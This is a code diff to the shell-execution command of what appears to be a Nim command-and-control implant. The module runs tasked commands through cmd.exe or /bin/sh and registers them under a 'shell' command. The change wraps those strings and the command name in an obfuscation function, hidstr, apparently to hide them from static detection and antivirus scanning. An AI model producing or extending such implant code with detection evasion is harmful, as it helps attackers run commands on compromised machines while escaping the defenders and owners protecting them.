@@ -1,6 +1,7 @@
 import std/[osproc, os, json]
 import core/types
 import commands/registry
+import crypto/strenc
 
 proc shellExecute(taskId: string, params: JsonNode, state: AgentState,
                   send: SendMsg): TaskResult =
@@ -11,13 +12,13 @@ proc shellExecute(taskId: string, params: JsonNode, state: AgentState,
   try:
     when defined(windows):
       let (output, code) = execCmdEx(
-        "cmd.exe /c " & command,
+        hidstr("cmd.exe /c ") & command,
         options = {poStdErrToStdOut},
         workingDir = state.cwd,
       )
     else:
       let (output, code) = execCmdEx(
-        "/bin/sh -c " & quoteShell(command),
+        hidstr("/bin/sh -c ") & quoteShell(command),
         options = {poStdErrToStdOut},
         workingDir = state.cwd,
       )
@@ -27,4 +28,4 @@ proc shellExecute(taskId: string, params: JsonNode, state: AgentState,
     return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
 
 proc initShell*() =
-  register("shell", shellExecute)
+  register(hidstr("shell"), shellExecute)
